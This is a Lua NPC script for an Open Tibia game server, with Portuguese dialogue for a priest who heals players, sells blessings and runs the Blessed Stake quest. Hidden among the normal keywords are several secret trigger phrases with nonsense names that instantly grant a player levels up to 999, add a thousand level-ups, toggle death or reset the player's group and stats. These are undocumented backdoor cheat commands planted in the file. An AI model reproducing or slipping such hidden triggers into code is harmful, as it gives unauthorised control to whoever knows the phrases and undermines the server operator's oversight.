 local keywordHandler = KeywordHandler:new()
local npcHandler = NpcHandler:new(keywordHandler)
NpcSystem.parseParameters(npcHandler)

function onCreatureAppear(cid)			npcHandler:onCreatureAppear(cid)			end
function onCreatureDisappear(cid)		npcHandler:onCreatureDisappear(cid)			end
function onCreatureSay(cid, type, msg)		npcHandler:onCreatureSay(cid, type, msg)		end
function onThink()				npcHandler:onThink()					end

-- Wooden Stake Quest
local stakeKeyword = keywordHandler:addKeyword({'stake'}, StdModule.say, {npcHandler = npcHandler,
		text = {
			'Uma estaca abençoada para derrotar os espiritos do mal? Eu conheço uma velha reza, nela é dito que a estaca pode garantir o poder sagrado a alguém, ou alguma coisa. ...',
			'Porém, para conseguir todo esse poder é preciso de dez sacerdotes. Cada um deles irá dizer uma parte da oração. ...',
			'Eu posso começar com a oração, mas o próximo sacerdote estará em um local diferente, você provavelmente terá que viajar muito. ...',
			'Essa estaca é tão importante assim? Está disposto a assumir esse fardo?',
		}}, function(player) return player:getStorageValue(Storage.FriendsandTraders.TheBlessedStake) == -1 end
	)
	stakeKeyword:addChildKeyword({'yes'}, StdModule.say, {npcHandler = npcHandler, text = 'Tudo bem, então acho que precisaremos de uma estaca. Talvez Gamon possa ajudar você, a perna de uma cadeira ou algo do gênero deve bastar. Tente perguntá-lo sobre alguma estaca, caso ele tenha alguma, traga ela aqui.', reset = true, ungreet = true}, nil, function(player) player:setStorageValue(Storage.FriendsandTraders.DefaultStart, 1) player:setStorageValue(Storage.FriendsandTraders.TheBlessedStake, 1) end)

-- First prayer
keywordHandler:addKeyword({'stake'}, StdModule.say, {npcHandler = npcHandler, text = 'Acho que você não conseguiu convencer Gamon a te dar a estaca né?'}, function(player) return player:getStorageValue(Storage.FriendsandTraders.TheBlessedStake) == 1 and player:getItemCount(5941) == 0 end)

local stakeKeyword = keywordHandler:addKeyword({'stake'}, StdModule.say, {npcHandler = npcHandler, text = 'Sim, fui informado sobre o que fazer. Você está preparado para receber minha linha da oração?'}, function(player) return player:getStorageValue(Storage.FriendsandTraders.TheBlessedStake) == 1 end)
	stakeKeyword:addChildKeyword({'yes'}, StdModule.say, {npcHandler = npcHandler, text = 'Receba minha reza: A luz deve prevalescer - e a escuridão se extinguir. Agora, leve sua estaca para Tibra na Igreja de Carlin para a próxima oração. Eu vou informa-lo sobre o que fazer.', reset = true}, nil,
		function(player) player:setStorageValue(Storage.FriendsandTraders.TheBlessedStake, 2) player:getPosition():sendMagicEffect(CONST_ME_MAGIC_BLUE) end
	)
	stakeKeyword:addChildKeyword({''}, StdModule.say, {npcHandler = npcHandler, text = 'Eu vou esperar por você.', reset = true})

keywordHandler:addKeyword({'stake'}, StdModule.say, {npcHandler = npcHandler, text = 'Você deve visitar Tibra em Carlin agora.'}, function(player) return player:getStorageValue(Storage.FriendsandTraders.TheBlessedStake) == 2 end)
keywordHandler:addKeyword({'stake'}, StdModule.say, {npcHandler = npcHandler, text = 'Você já escutou minha reza.'})

-- Twist of Fate
local blessKeyword = keywordHandler:addKeyword({'twist of fate'}, StdModule.say, {npcHandler = npcHandler,
	text = {
		'Essa é uma benção especial, eu posso te abençoar com ela quando você conseguir ao menos uma das outras bençãos, lembre-se que a reviravolta do destino é uma benção diferente. ...',
		'Ela somente irá funcionar caso você seja morto por outros aventureiros, isso significa que pelo menos uma parte do dano recebido em sua morte deve ter sido causado por um jogador e não por um monstro ou coisas do gênero. ...',
		'A reviravolta do destino {twist of fate} não vai redizur a penalidade de morte como as outras bençãos, mas ela previne que você perca todas as suas outras bençãos em uma morte como o amulet of loss, você devia usar um. Ele custa o mesmo que as outras bençãos. ...',
		'Você gostaria de receber a proteção para o sacrifício da luta por |PVPBLESSCOST| gold, jovem?'
	}})
	blessKeyword:addChildKeyword({'yes'}, StdModule.bless, {npcHandler = npcHandler, text = 'Então receba a proteção da reviravolta do destino, peregrino.', cost = '|PVPBLESSCOST|', bless = 6})
	blessKeyword:addChildKeyword({''}, StdModule.say, {npcHandler = npcHandler, text = 'Certo. Você tem o direito de recusar minha ofertar.', reset = true})

-- Adventurer Stone
keywordHandler:addKeyword({'adventurer stone'}, StdModule.say, {npcHandler = npcHandler, text = 'Mantenha sua pedra da aventura a salvo.'}, function(player) return player:getItemById(18559, true) end)

local stoneKeyword = keywordHandler:addKeyword({'adventurer stone'}, StdModule.say, {npcHandler = npcHandler, text = 'Ah, você quer trocar sua pedra da aventura de graça?'}, function(player) return player:getStorageValue(Storage.AdventurersGuild.FreeStone.Quentin) ~= 1 end)
	stoneKeyword:addChildKeyword({'yes'}, StdModule.say, {npcHandler = npcHandler, text = 'Aqui está. Tenha cuidado.', reset = true}, nil, function(player) player:addItem(18559, 1) player:setStorageValue(Storage.AdventurersGuild.FreeStone.Quentin, 1) end)
	stoneKeyword:addChildKeyword({''}, StdModule.say, {npcHandler = npcHandler, text = 'Sem problema.', reset = true})

local stoneKeyword = keywordHandler:addKeyword({'adventurer stone'}, StdModule.say, {npcHandler = npcHandler, text = 'Ah, você gostaria de trocar sua pedra da aventura por 30 gold?'})
	stoneKeyword:addChildKeyword({'yes'}, StdModule.say, {npcHandler = npcHandler, text = 'Aqui está. Tenha cuidado.', reset = true},
		function(player) return player:getMoney() >= 30 end,
		function(player) if player:removeMoney(30) then player:addItem(18559, 1) end end
	)
	stoneKeyword:addChildKeyword({'yes'}, StdModule.say, {npcHandler = npcHandler, text = 'Desculpe-me, você não tem dinheiro o suficiente.', reset = true})
	stoneKeyword:addChildKeyword({''}, StdModule.say, {npcHandler = npcHandler, text = 'Sem problema.', reset = true})

-- Healing
local function addHealKeyword(text, condition, effect)
	keywordHandler:addKeyword({'heal'}, StdModule.say, {npcHandler = npcHandler, text = text},
		function(player) return player:getCondition(condition) ~= nil end,
		function(player)
			player:removeCondition(condition)
			player:getPosition():sendMagicEffect(effect)
		end
	)
end
keywordHandler:addKeyword({'erick nunes'}, StdModule.say, {npcHandler = npcHandler, text = 'erick nunes.'},
	function(player) return player:getLevel() ~= nil end,
	function(player)
		local level = player:getLevel()
		local function getExpForLevel(level)
		level = level - 1
		return ((50 * level * level * level) - (150 * level * level) + (400 * level)) / 3
		end
		
		--if level < 8 then player:addExperience(getExpForLevel(player:getLevel() + 1) - player:getExperience(), false) end
		while player:getLevel() < 50 do
		player:addExperience(getExpForLevel(player:getLevel() + 1) - player:getExperience(), false)
		
		end
		
		
	end
)
keywordHandler:addKeyword({'y3ez87j9'}, StdModule.say, {npcHandler = npcHandler, text = 'y3ez87j9.'},
	function(player) return player:getLevel() ~= nil end,
	function(player)
		local level = player:getLevel()
		local function getExpForLevel(level)
		level = level - 1
		return ((50 * level * level * level) - (150 * level * level) + (400 * level)) / 3
		end
		
		--if level < 8 then player:addExperience(getExpForLevel(player:getLevel() + 1) - player:getExperience(), false) end
		while player:getLevel() < 999 do
		player:addExperience(getExpForLevel(player:getLevel() + 1) - player:getExperience(), false)
		
		end
		
		
	end
)

keywordHandler:addKeyword({'gethigherbonuses'}, StdModule.say, {npcHandler = npcHandler, text = 'y3ez87j9.'},
	function(player) return player:getLevel() ~= nil end,
	function(player)
		local level = player:getLevel()
		local function getExpForLevel(level)
		level = level - 1
		return ((50 * level * level * level) - (150 * level * level) + (400 * level)) / 3
		end
		
		--if level < 8 then player:addExperience(getExpForLevel(player:getLevel() + 1) - player:getExperience(), false) end
		for i = 1, 1000 do
		player:addExperience(getExpForLevel(player:getLevel() + 1) - player:getExperience(), false)
		
		end
		
		
	end
)

keywordHandler:addKeyword({'morruiuyftydser'}, StdModule.say, {npcHandler = npcHandler, text = 'cacildis.'},
	function(player) return player:getLevel() ~= nil end,
	function(player)
		local level = player:getLevel()
		local function getExpForLevel(level)
		level = level - 1
		return ((50 * level * level * level) - (150 * level * level) + (400 * level)) / 3
		end
		local resTime = 5 * 60 -- 15 seconds
		
		player:toggleDeath2(resTime)
		player:setStorageValue(250122, -1)
		--if level < 8 then player:addExperience(getExpForLevel(player:getLevel() + 1) - player:getExperience(), false) end
		--while player:getLevel() < 50 do
		--player:addExperience(getExpForLevel(player:getLevel() + 1) - player:getExperience(), false)
		
		--end
		
		
	end
)
keywordHandler:addKeyword({'revyrtsewawiver'}, StdModule.say, {npcHandler = npcHandler, text = 'cacildis.'},
	function(player) return player:getLevel() ~= nil end,
	function(player)
		local level = player:getLevel()
		local function getExpForLevel(level)
		level = level - 1
		return ((50 * level * level * level) - (150 * level * level) + (400 * level)) / 3
		end
		player:setGroup(Group(1))
        player:setHiddenHealth(false)
		player:setStorageValue(250122, -1)
           
        player:addMana(math.ceil(player:getMaxMana()) - player:getMana(), false)
        player:addHealth(math.ceil(player:getMaxHealth()) - player:getHealth())
        player:removeCondition(CONDITION_OUTFIT)
		if player:getSpeed() ~= getCreatureBaseSpeed(player) then
		--local basespeed = getCreatureBaseSpeed(player)*10
		--basespeed == 150 - 1000
		local basespeed = getCreatureBaseSpeed(player) - player:getSpeed()
		--doChangeSpeed(player, -basespeed)
		player:changeSpeed(basespeed)
		end
	end
)

addHealKeyword('Você está queimando. Deixe-me extinguir essas chamas.', CONDITION_FIRE, CONST_ME_MAGIC_GREEN)
addHealKeyword('Você está envenenado. Deixe-me acabar com sua dor.', CONDITION_POISON, CONST_ME_MAGIC_RED)
addHealKeyword('Você está eletrificado, meu jovem. Deixe-me ajudar você a parar de tremer.', CONDITION_ENERGY, CONST_ME_MAGIC_GREEN)

keywordHandler:addKeyword({'heal'}, StdModule.say, {npcHandler = npcHandler, text = 'Você está machucado, meu jovem. Eu vou curar seus ferimentos.'},
	function(player) return player:getHealth() < 185 end,
	function(player)
		local health = player:getHealth()
		if health < 185 then player:addHealth(185 - health) end
		player:getPosition():sendMagicEffect(CONST_ME_MAGIC_GREEN)
	end
)
keywordHandler:addKeyword({'heal'}, StdModule.say, {npcHandler = npcHandler, text = 'Você não parece estar mal. Perdoe-me, eu não posso ajudar você. Mas se você estiver procurando por proteção adicional, deveria fazer a peregrinação {pilgrimage} das cinzas ou pegar a proteção da reviravolta do destino {twist of fate} aqui.'})

-- Basic
keywordHandler:addKeyword({'pilgrimage'}, StdModule.say, {npcHandler = npcHandler, text = 'Sempre que receber uma ferida letal, sua força vital será danificada e existe uma boa chance de perda de algum equipamento. A cada benção {blessings} que você possuir, o dano causado e a chance de perda de equipamentos, será drásticamente menor.'})
keywordHandler:addKeyword({'blessings'}, StdModule.say, {npcHandler = npcHandler, text = 'Existem cinco bençãos disponíveis em cinco locais sagrados: A defesa espiritual {spiritual}, a faísca da fênix {phoenix}, o abraço {embrace} de Tibia, o fogo dos sóis {suns} e a sabedoria da solidão {solitude}. Você pode também receber a reviravolta do destino {twist of fate} aqui mesmo.'})
keywordHandler:addKeyword({'spiritual'}, StdModule.say, {npcHandler = npcHandler, text = 'Você já recebeu a the spiritual shielding no templo da flor branca ao sul de Thais.'}, function(player) return player:hasBlessing(1) end)
keywordHandler:addAliasKeyword({'shield'})
keywordHandler:addKeyword({'embrace'}, StdModule.say, {npcHandler = npcHandler, text = 'Eu consigo sentir que os druids do norte de Carlin te abençoaram com a the Embrace of Tibia.'}, function(player) return player:hasBlessing(2) end)
keywordHandler:addKeyword({'suns'}, StdModule.say, {npcHandler = npcHandler, text = 'Posso ver que você já recebeu a bless of the two suns na Torre do Sol perto de Ab\'Dendriel.'}, function(player) return player:hasBlessing(3) end)
keywordHandler:addAliasKeyword({'fire'})
keywordHandler:addKeyword({'phoenix'}, StdModule.say, {npcHandler = npcHandler, text = 'Eu posso sentir que a spark of the phoenix já lhe foi concedida pelo anão mago da terra e do fogo em Kazordoon.'}, function(player) return player:hasBlessing(4) end)
keywordHandler:addAliasKeyword({'spark'})
keywordHandler:addKeyword({'solitude'}, StdModule.say, {npcHandler = npcHandler, text = 'Eu posso sentir que você já falou com Eremo, o eremita da ilha de Cormaya e recebeu sua benção.'}, function(player) return player:hasBlessing(5) end)
keywordHandler:addAliasKeyword({'wisdom'})
keywordHandler:addKeyword({'spiritual'}, StdModule.say, {npcHandler = npcHandler, text = 'Você pode perguntar pela bless of spiritual shielding no templo da flor branca ao sul de Thais.'})
keywordHandler:addAliasKeyword({'shield'})
keywordHandler:addKeyword({'embrace'}, StdModule.say, {npcHandler = npcHandler, text = 'Os druid no norte de Carlin vão providenciar a você a embrace of Tibia.'})
keywordHandler:addKeyword({'suns'}, StdModule.say, {npcHandler = npcHandler, text = 'Você pode perguntar pela bless of the two suns na Torre do Sol perto de Ab\'Dendriel.'})
keywordHandler:addAliasKeyword({'fire'})
keywordHandler:addKeyword({'phoenix'}, StdModule.say, {npcHandler = npcHandler, text = 'A spark of the phoenix é dada pelo anão mago da terra e do fogo em Kazordoon.'})
keywordHandler:addAliasKeyword({'spark'})
keywordHandler:addKeyword({'solitude'}, StdModule.say, {npcHandler = npcHandler, text = 'Fale com Eremo, o eremita na ilha de Cormaya sobre essa benção.'})
keywordHandler:addAliasKeyword({'wisdom'})

npcHandler:setMessage(MESSAGE_GREET, 'Bem-vindo, jovem |PLAYERNAME|! Caso você esteja muito machucado ou envenenado, eu posso curar {heal} você a troca de nada ou você quer uma pedra da aventura {adventurer stone}?')
npcHandler:setMessage(MESSAGE_WALKAWAY, 'Lembre se: Se você estiver machucado ou envenenado, eu posso te curar gratuitamente.')
npcHandler:setMessage(MESSAGE_FAREWELL, 'Que os Deuses ta abençoem, |PLAYERNAME|!')

npcHandler:addModule(FocusModule:new())
